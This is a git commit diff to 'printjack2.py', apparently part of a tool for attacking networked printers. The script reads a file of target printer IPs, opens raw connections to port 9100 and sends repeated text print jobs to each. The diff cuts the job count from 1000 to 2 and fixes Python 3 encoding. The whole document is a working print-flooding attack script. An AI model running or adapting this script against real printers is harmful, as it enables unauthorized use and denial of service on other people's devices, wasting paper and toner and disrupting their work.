0a263047101ff0bd0c818d0c9d8f519effb1dc54
pietrobiondi <pietro.biondi94@gmail.com>
2022-03-11 11:55:11 +0100

    Update with python3 fixes

--- Printjack/printjack2.py
+++ Printjack/printjack2.py
@@ -1,14 +1,14 @@
 import socket
-with open("Printjack/IPs.txt") as f: #file containing IPs of target printers
+with open("IPs.txt") as f: #file containing IPs of target printers
     lines = f.read().splitlines() 
 print("-Reading IPs file-")
 for ip in lines:
-	textfile = open("Printjack/exampletext.txt", "r") #ascii file to be printed
+	textfile = open("bot.txt", "r") #ascii file to be printed
 	textlines = textfile.readlines()
-	for count in range(0,1000): #number of print jobs
+	for count in range(0,2): #number of print jobs
 		s = socket.socket()
 		s.connect((ip, 9100))
 		for line in textlines:
-			s.send(line+"\n")
+			s.send(str.encode(line))
 			print("-Sending to Printer-")
-			s.close()
+		s.close()
